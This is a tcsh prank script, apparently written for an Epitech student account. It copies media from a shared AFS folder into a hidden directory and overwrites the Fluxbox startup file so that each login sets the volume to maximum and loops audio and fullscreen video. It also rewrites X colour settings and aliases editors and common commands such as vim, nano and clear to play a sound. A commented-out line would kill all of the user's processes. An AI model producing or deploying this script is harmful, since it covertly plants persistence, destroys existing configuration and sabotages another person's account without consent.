#!/bin/tcsh

rm -rf ~/.genki;

cp -r /afs/epitech.net/users/all/candio_a/public/genki ~/;
mv ~/genki ~/.genki;

echo "xterm*background:		green\
      xterm*foreground:		red" >> ~/.Xdefaults

echo "Xm*background:		green\
      Xm*foreground:		red" >> ~/.Xdefaults

echo "rxvt*background:		green\
      rxvt*foreground:		red" >> ~/.Xdefaults

echo "dlock*background:		green\
      dlock*foreground:		red" >> ~/.Xdefaults

echo "#\!/bin/sh" > ~/.fluxbox/startup;
echo "xmodmap '~/.Xmodmap' " >> ~/.fluxbox/startup;
echo "exec display -window root ~/.genki/genki.jpg &" >> ~/.fluxbox/startup;
echo "exec amixer set Master 100%" >> ~/.fluxbox/startup;
echo "exec cvlc --input-repeat=9999 ~/.genki/genki.mp3 &" >> ~/.fluxbox/startup;
echo "exec cvlc --no-embedded-video --video-wallpaper --input-repeat=9999 ~/.genki/smeg.flv& " >> ~/.fluxbox/startup;

echo "exec fluxbox" >> ~/.fluxbox/startup;

echo "alias ne 'cvlc ~/.genki/dah.mp3 &'   " >> ~/.mytcshrc;
echo "alias emacs 'cvlc --no-embedded-video --video-wallpaper --fullscreen --input-repeat=9999 ~/.genki/smeg.flv&' " >> ~/.fluxbox/startup;
echo "alias vim 'cvlc ~/.genki/dah.mp3&' " >> ~/.mytcshrc;
echo "alias gedit 'cvlc ~/.genki/dah.mp3&'  " >> ~/.mytcshrc;
echo "alias nano 'cvlc ~/.genki/dah.mp3&' " >> ~/.mytcshrc;
echo "alias ll 'cvlc ~/.genki/dah.mp3 &' " >> ~/.mytcshrc;
echo "alias clear 'cvlc ~/.genki/dah.mp3&' " >> ~/.mytcshrc;

source ~/.mytcshrc;

display -window root ~/.genki/genki.jpg;
amixer set Master 100%;
cvlc --input-repeat=9999 ~/.genki/genki.mp3 &;
xrdb -merge ~/.Xdefaults;
cvlc --no-embedded-video --video-wallpaper --fullscreen --input-repeat=9999 ~/.genki/smeg.flv &;
#kill -9 -1;
